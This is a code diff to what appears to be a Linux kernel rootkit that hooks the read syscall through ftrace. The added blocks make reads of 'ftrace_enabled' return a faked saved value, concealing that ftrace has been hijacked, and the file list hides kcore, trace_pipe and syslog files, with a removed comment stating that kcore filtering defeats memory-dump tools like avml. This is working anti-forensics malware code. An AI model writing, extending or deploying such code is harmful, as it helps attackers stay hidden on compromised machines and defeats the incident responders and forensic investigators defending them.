@@ -2,8 +2,14 @@
 #include "../ftrace/ftrace_helper.h"
 #include "../include/clear_taint_dmesg.h"
 
+extern char saved_ftrace_value[16];
+extern bool ftrace_write_intercepted;
+
 #define MAX_CAP (64*1024)
 #define MIN_KERNEL_READ 256
+
+static DEFINE_SPINLOCK(ftrace_read_lock);
+static unsigned long last_ftrace_read_jiffies = 0;
 
 static const char *virtual_fs_types[] = {
     "proc",
@@ -46,7 +52,7 @@ notrace static bool should_filter_file(const char *filename) {
             strcmp(filename, "vmallocinfo") == 0 ||
             strcmp(filename, "syslog.1") == 0 ||
             strcmp(filename, "trace_pipe") == 0 ||
-            strcmp(filename, "kcore") == 0 || //temp fix to avoid memory dump using tools like avml
+            strcmp(filename, "kcore") == 0 ||
             strcmp(filename, "touched_functions") == 0);
 }
 
@@ -307,6 +313,43 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     if (!user_buf)
         return -EFAULT;
 
+    if (ftrace_write_intercepted) {
+        struct file *check_file = fget(fd);
+        if (check_file) {
+            const char *check_name = NULL;
+            if (check_file->f_path.dentry && check_file->f_path.dentry->d_name.name)
+                check_name = check_file->f_path.dentry->d_name.name;
+            
+            if (check_name && strcmp(check_name, "ftrace_enabled") == 0) {
+                size_t fake_len = strlen(saved_ftrace_value);
+                unsigned long flags;
+                unsigned long now = jiffies;
+                bool should_return_data = false;
+                
+                spin_lock_irqsave(&ftrace_read_lock, flags);
+                if (time_after(now, last_ftrace_read_jiffies + msecs_to_jiffies(100))) {
+                    should_return_data = true;
+                    last_ftrace_read_jiffies = now;
+                }
+                spin_unlock_irqrestore(&ftrace_read_lock, flags);
+                
+                fput(check_file);
+                
+                if (!should_return_data) {
+                    return 0;
+                }
+                
+                if (fake_len <= count) {
+                    if (!copy_to_user(user_buf, saved_ftrace_value, fake_len)) {
+                        return fake_len;
+                    }
+                }
+                return -EFAULT;
+            }
+            fput(check_file);
+        }
+    }
+
     struct file *file = fget(fd);
     if (!file)
         return orig_read(regs);
@@ -360,6 +403,43 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
 
     if (!user_buf)
         return -EFAULT;
+
+    if (ftrace_write_intercepted) {
+        struct file *check_file = fget(fd);
+        if (check_file) {
+            const char *check_name = NULL;
+            if (check_file->f_path.dentry && check_file->f_path.dentry->d_name.name)
+                check_name = check_file->f_path.dentry->d_name.name;
+            
+            if (check_name && strcmp(check_name, "ftrace_enabled") == 0) {
+                size_t fake_len = strlen(saved_ftrace_value);
+                unsigned long flags;
+                unsigned long now = jiffies;
+                bool should_return_data = false;
+                
+                spin_lock_irqsave(&ftrace_read_lock, flags);
+                if (time_after(now, last_ftrace_read_jiffies + msecs_to_jiffies(100))) {
+                    should_return_data = true;
+                    last_ftrace_read_jiffies = now;
+                }
+                spin_unlock_irqrestore(&ftrace_read_lock, flags);
+                
+                fput(check_file);
+                
+                if (!should_return_data) {
+                    return 0;
+                }
+                
+                if (fake_len <= count) {
+                    if (!copy_to_user(user_buf, saved_ftrace_value, fake_len)) {
+                        return fake_len;
+                    }
+                }
+                return -EFAULT;
+            }
+            fput(check_file);
+        }
+    }
 
     struct file *file = fget(fd);
     if (!file)
